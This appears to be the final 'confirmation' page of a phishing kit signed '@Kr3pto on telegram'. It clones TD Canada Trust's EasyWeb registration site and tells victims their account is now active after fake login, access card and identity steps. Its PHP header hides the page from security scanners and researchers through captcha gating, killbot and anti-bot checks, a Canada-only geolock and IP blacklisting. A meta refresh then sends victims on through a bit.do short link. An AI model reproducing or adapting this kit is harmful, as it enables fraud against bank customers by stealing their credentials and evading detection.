<?php
// @Kr3pto on telegram
require "configg.php";
require "tc_assetz/ninc/session_protect.php";
require "tc_assetz/ninc/functions.php";
if($_SESSION['passed_captcha'] == 'yes'){
	
}else{
	 header( "Location: index.php" ); 
}
if($internal_antibot == 1){
	require "tc_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "tc_assetz/mob_lock.php";
}
if($CA_lock == 1){
	if(onlyca() == true){
	
	}else{
		$fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
?>
<?php
include('blackhole/index.php');
        include 'prevents/anti7.php';
            include 'prevents/anti8.php';
                include 'prevents/anti9.php';
                include 'prevents/block.php';
?>
<!DOCTYPE html>
<script type="text/javascript">
<!--
if (screen.width >= 699) {
document.location = "antibot.php";
}
//-->
</script>
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class=" webkit safari safari14 mac js"><head>
    <meta http-equiv="refresh" content="10;url=http://bit.do/fTWjV"/>
	<meta http-equiv="x-ua-compatible" content="IE=edge">
	<title>EasyWeb Registration:  Confirmation
	</title>
	<!--<f:loadBundle basename="/prod/links" var="links" />-->
	<!--<f:loadBundle basename="/prod/oauth" var="oauth" />-->

	<script type="text/javascript" src="/waw/esr/js/jquery/jquery-1.12.3.min.js"><!--

//--></script>
	<script type="text/javascript" src="/waw/esr/js/jquery/jquery-migrate-1.4.1.min.js"><!--

//--></script>
	<script type="text/javascript" src="/waw/esr/js/jquery/jquery.metadata.js"><!--

//--></script>
	<script type="text/javascript" src="/waw/esr/js/common.js"><!--

//--></script>
	<script type="text/javascript" src="/waw/esr/js/fieldValidationSupport.js"><!--

//--></script>
	<script type="text/javascript" src="/waw/esr/standards/evergreen/1_0/js/default.js"><!--

//--></script>
	
	<link rel="stylesheet" type="text/css" href="tc_assetz/styles/evergreen_theme_14_3.css">
	
	<link rel="stylesheet" type="text/css" href="tc_assetz/styles/default.css">
	<link rel="stylesheet" type="text/css" href="tc_assetz/styles/esrEvergreen.css">
	<link rel="stylesheet" type="text/css" href="tc_assetz/styles/progressBar.css">
	
	<link rel="icon" type="image/vnd.microsoft.icon" href="favicon.ico">
	<link rel="SHORTCUT ICON" href="favicon.ico"> 
	
	<meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">
	<meta content="no-cache" http-equiv="pragma">
	<meta content="en_CA" http-equiv="Content-Language">

</head>

<body class="td-JS-enabled"><script type="text/javascript"> myfaces.config._autoeval = true; </script>

<!-- Used by UAP integration to set consumer cookie -->
<iframe id="uapCookieFrame" data-clientid="e7366b62-b7f6-4550-b857-8eda5825c45c" data-consumerid="ewesr" data-redirecturi="/waw/esr/selfRegistration.htm?loggedInFromGadget=true&amp;LN=" data-pingurl="https://authorization.td.com" data-uapurl="https://authentication.td.com" data-scope="debit.acs.debcrd.r debit.acs.debcrd.w" style="visibility:hidden !important; height: 0 !important;"></iframe>
	<div id="td-wrapper">
    	<div id="td-container">
				<!-- The default header. Content pages can override this. -->

    <div id="td-layout-header" class="td-layout-row">
		<div class="td-layout-column td-layout-grid15 td-layout-column-first td-layout-column-last">
			<div id="td-logo">
				<img src="tc_assetz/styles/EasywbLogo.gif" alt="TD Canada Trust EasyWeb">
			</div>
		</div>
	</div>
	<div class="td-layout-row td-noprint" id="td-layout-nav-main">
		<div class="td-layout-column td-layout-grid15 td-layout-column-first td-layout-column-last">
			<div id="td-nav-divider"></div>
		</div>
	</div>

			<div id="td-layout-contentarea" class="td-layout-row">
				<div class="td-layout-column td-layout-grid12 td-layout-column-first">
					<!-- The default progress Bar. Content pages can override this. -->

	<div id="td-pagetitlearea">
		<h1><span id="title">EasyWeb Registration: Confirmation</span></h1>
		
		<div class="progressindicator td-margin-top-large td-layout-grid10">
			<progress id="progressLine" max="4" value="4"><span id="progressLineText" class="td-accesstext">step 4 of 4</span></progress>
			<div class="progressbar"><span id="progressLineIE" style="width:25%;"></span></div>
			<ol data-progress-steps="4">
				<li id="progressItem1" class="step1 step-done">
				<span>Login
					<span id="progressItemAccess1" class="td-accesstext">completed step</span>
				</span>
				</li>
				<li id="progressItem2" class="step2 step-done">
					<span>Access Card
						<span id="progressItemAccess2" class="td-accesstext">completed step
						</span>
					</span>
				</li>
				<li id="progressItem3" class="step3 step-done">
					<span>Customer Identification
						<span id="progressItemAccess3" class="td-accesstext">completed step
						</span>
					</span>
				</li>
				<li id="progressItem4" class="step4 step-active">
					<span>Confirmation 
						<span id="progressItemAccess4" class="td-accesstext"> current step
						</span>
					</span>
				</li>
			</ol>
		</div>
		<div style="display:none"><span id="progressTitle1">Overview</span><span id="progressTitle2">Customer Identification</span><span id="progressTitle3">Consent &amp; Setup</span><span id="progressTitle4">Confirmation </span><span id="AccessTextCompleted">completed step</span><span id="AccessTextCurrent">current step</span><span id="AccessTextStep">step</span><span id="AccessTextOf">of</span>
		</div>
	</div>
			 	</div>
				<div class="td-layout-column td-layout-grid10 td-callout td-callout-primary td-cs-tertiary">
		<script type="text/javascript" src="/waw/idp/js/loginGadget.js"><!--

//--></script>

		<noscript>
		&lt;div id="jsErrorMessage"&gt;
		&lt;ul&gt; 
			&lt;li&gt;To continue, please open your browser's preferences and enable JavaScript.
			&lt;/li&gt;
		&lt;/ul&gt;
		&lt;/div&gt;
		</noscript>

		<div id="browserNotSupported" style="display:none">
			<div id="browserNotSupportedText">While we have optimized our service to work with browsers that the majority of our customers use, we have detected that you are using a browser that we currently do not support. You can continue with registration, but some features may not function properly.
			</div>			
		</div>
		   
		<!-- Added for Login Gadget integration -->
		<div id="LoginGadgetErr"></div>

		<!-- Static text for login information --> 
		<!-- Static text for welcome information --> 
		<h2 class="td-margin-top-small td-margin-bottom-large">Your Account Is Now Active
		</h2>
		
		<p>Your EasyWeb access is now active and ready to use 
		</p>
		<p>If you are currently registered for WebBroker or MyInsurance, EasyWeb will be added to your existing profile, giving you convenient single login access to all your accounts. 
		</p>
		<div class="td-margin-bottom-large">Thank you for choosing TD Canada Trust
		</div>
		<div class="td-layout-row">
		<div class="td-layout-column td-layout-column-first td-layout-grid1">&nbsp;</div>
		<div class="td-layout-column td-layout-column-last td-layout-grid9">
		<ul>	
		
		</ul>
		</div>
		</div>
		
		<hr class="td-divider-fade">
		
			
			<p></p><form id="SelfRegOverview" name="SelfRegOverview" method="post" action="/waw/esr/selfRegistration.htm?execution=e1s1" enctype="application/x-www-form-urlencoded" class="form-inline td-margin-top-large">
	
			<div class="td-layout-row">
	        	<!-- Selection for new user or existing user --> 
				<div class="td-layout-column td-layout-column-first td-layout-grid1">&nbsp;</div>
				<div class="td-layout-column td-layout-column-last td-layout-grid9"><table id="SelfRegOverview:SelfRegOverview_radioGroup_easyweb"></table>
				</div>
			</div>
			<div class="td-layout-row">
				<!-- Selection for new user or existing user --> 
				<div class="td-layout-column td-layout-column-first td-layout-grid1">&nbsp;</div>
				<div class="td-layout-column td-layout-column-last td-layout-grid9"><table id="SelfRegOverview:SelfRegOverview_radioGroup_newuser"></table>
				</div>
			</div>
			<div class="td-layout-row td-margin-top-large">
				<div class="td-layout-column td-layout-column-first td-layout-column-last td-layout-grid8">
				    <!-- Added for login gadget integration : start -->
					<div id="oDiv">
						<div id="iDiv" style="display: none;">
							
						</div>
					</div>
				</div>
			</div>
		    <!--  Added for login gadget integration : end -->

			
			
			<!-- Changed id to nextNewUser for Login Gadget Integration -->
			
			
			<div class="td-anchorbottom td-anchorleft">
			
				&nbsp;&nbsp;
				<!--  Added for login gadget integration : end --><script type="text/javascript" src="/waw/esr/javax.faces.resource/oamSubmit.js.htm?ln=org.apache.myfaces"><!--

//--></script><script type="text/javascript" src="/waw/esr/javax.faces.resource/jsf.js.htm?ln=javax.faces"><!--

//--></script>	
			</div></form>	
			<p></p>
		
	
		
		<!-- artf1120720: Back Button | MFA Pages | Safari 3.1| First radio button already clicked by Default | Start -->
		<script type="text/javascript"><!--
clearRadioButton('SelfRegOverview', 'SelfRegOverview_radioGroup_easyweb', '')
//--></script>
		<!-- artf1120720: Back Button | MFA Pages | Safari 3.1| First radio button already clicked by Default | End -->
		<script type="text/javascript"><!--

		
		//add progress bar
		selectProgressStep(1);

		function ESRWebAnalyticsFunctions() {
			s.pageName = staticPageName + "/registrationOverview.xhtml";
			trackConversions('tdct:easyweb:self-registration','ProcessStart',false,'Start','','');
		}
	    
//--></script>
	    <!-- R18.1.2.2017.10.23.B0 -->

		<script type="text/javascript"><!--

			$(window).on("load", function() {
				if (window.location.hash.indexOf("noLogin") != -1) {
					$("[name='SelfRegOverview:SelfRegOverview_radioGroup_easyweb']").prop('checked', false);
					$("[name='SelfRegOverview:SelfRegOverview_radioGroup_newuser']").prop('checked', true);
					var nextNewUser = document.getElementById('SelfRegOverview:nextNewUser');
					nextNewUser.click();
				}
			});
		
//--></script>
			 	</div>
			 	<div class="td-layout-grid4 td-floatright" style="padding-right:55px;"><div><style>
#c2tHolder{
margin:0px; padding:0px;
width:200px;
}
#c2tHolderLeft{
margin:0px; padding:0px;
width:25px;
float:left;
}
#c2tHolderRight{
margin:0px; padding:0px;
margin-left:3px;
width:142px;
float:left;
}
#c2tHolderRight ul{
 margin-left: 3px; padding-left: 3px;  vertical-align: middle;
}

.nobr{
white-space:nowrap;}
.nav5b, .nav5b A, .nav5b A:VISITED, .nav5b A:ACTIVE, .nav5b A:HOVER, .nav5b A:LINK{
	color: #2D5C3D !important;
	text-decoration : none;
	font-family: verdana, helvetica, sans serif;
	font-size: 10px;
}
</style>


<div id="c2tHolder">
	<div id="c2tHolderLeft">
		<img src="https://www.tdcanadatrust.com/easyweb5/registration/images/icon_help.gif" alt=" ">
	</div><!--end of c2tHolderLeft-->
		
	<div id="c2tHolderRight">
		<h3>Need Help?</h3>
			<ul style="margin-top:10px;" class="td-copy-sub td-list-links">
				<li><a href="javascript:void(0)" onclick="window.open('http://td.intelliresponse.com/easyweb/index.jsp?requestType=NormalRequest&amp;source=100&amp;id=1055&amp;question=easyweb+self+registration+assistance','td','toolbars=no,height=460,width=520,scrollbars=yes')">Get more info</a></li>
				<!--<li class="nav5b"><span class="nav5b">Call us at </br>1-866-222-3456</span></li>-->
				<!--<li><a href="" class="">Click here to speak with a Banking Specialist</a></li>-->
				<!--<li><a href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/easyweb-demo.jsp">Try the EasyWeb Demo</a></li>-->
			</ul>	
			</div><!--end of c2tHolderRight-->
	<div class="td-copy-sub">
	<strong>Small Business Banking Customers</strong> can register by:
	<ul>
	<li> Calling EasyLine telephone banking at <strong>1-866-222-3456</strong>
	</li><li> Visiting your nearest <a href="http://www.tdcanadatrust.com/customer-service/contact-us/branch-locator/index.jsp" class="td-popupwindow td-link-newwindow-withicon" target="_blank" aria-describedby="aria-45241"><span class="td-link-newwindow-label">TD Canada Trust branch</span>&nbsp;<span class="td-link-newwindow-icon" id="aria-45241">(opens new window)</span></a>
	</li></ul>
	</div>	
</div><!--end of c2tHolder-->



</div>
			 	</div>
		 	</div>
		</div>	
	
	<footer class="td-layout-row" id="td-layout-footer" role="complementary">
		<div class="td-layout-column td-layout-grid5 td-noprint td-layout-column-first">
			<ul class="td-list-inline td-copy-sub td-link-colour-grey td-link-nounderline">
				<li><a href="http://www.td.com/privacyandsecurity" onclick="return footerLinks('http://www.td.com/privacyandsecurity');" class="first">Privacy and Security</a>
				</li>
				<li><a href="http://www.td.com/legal/index_inc.jsp" onclick="return footerLinks('http://www.td.com/legal/index_inc.jsp');">Legal</a>
				</li>
				<li><a href="http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/index.jsp" onclick="return footerLinks('http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/index.jsp');">Accessibility</a>
				</li>
			</ul>
		</div>
		<div id="copyrightTxt" class="rightFooterTxt">TD Group Financial Services site - Copyright&nbsp;©&nbsp;TD
		</div>
	</footer>

    <div id="footerPane" class="rightFooterTxt">(Server ID: &nbsp;S1A &nbsp;:&nbsp;c297d9fa-e95d-4b63-aa55-48f6a4d8f1a8&nbsp;)
    </div>
	</div>

<!-- BEGIN Omniture SUPPORT -->
<!-- SiteCatalyst code version: H.23.3.
Copyright 1996-2012 Adobe, Inc. All Rights Reserved
More info available at http://www.omniture.com -->
<script type="text/javascript" src="/waw/esr/js/s_code_esr.js"><!--

//--></script>
<script type="text/javascript"><!--


	// set focus on the error messages div if it exists, this is an acessibility feature.
	$(document).ready(function() {
		if(document.getElementById('errorAlertDiv')) {
			scrollAndFocus('#errorAlertDiv');
		}
	});

	try{
		s.hier1 = s.prop7 = "ESR:Easyweb";
		s.channel = "ca-en";
		
		if(false) {
			s.prop12="authenticated";
		} else {
			s.prop12="not-authenticated";
		}
		// Determine whether error occured
		if(document.getElementById('errorMessage')) {
			if( trim(document.getElementById('errorMessage').innerHTML).length ) {
				s.eVar13 = trim(removeHTMLTags(document.getElementById('errorMessage').innerHTML));
				s.events=s.apl(s.events,'event10',',',1);
			}
		}		
		// Call addiitonal WebAnalytics fucntions if they have been defined on the child page
		if(typeof ESRWebAnalyticsFunctions != "undefined") {
			ESRWebAnalyticsFunctions();
		}		
		/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
		var s_code=s.t();if(s_code)document.write(s_code)//-->
	}
	catch(err){}

//--></script>
<script type="text/javascript"><!--

 if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')

//--></script>
<noscript>
&lt;a href="http://www.omniture.com" title="Web Analytics"&gt;&lt;img src="http://metrics.td.com/b/ss/tdtdct/1/H.22--NS/0" height="1" width="1" border="0" /&gt;&lt;/a&gt;
</noscript>
<!--/DO NOT REMOVE/-->
<!-- End SiteCatalyst code version: H.23.3. -->
<!-- END Omniture -->

</body></html>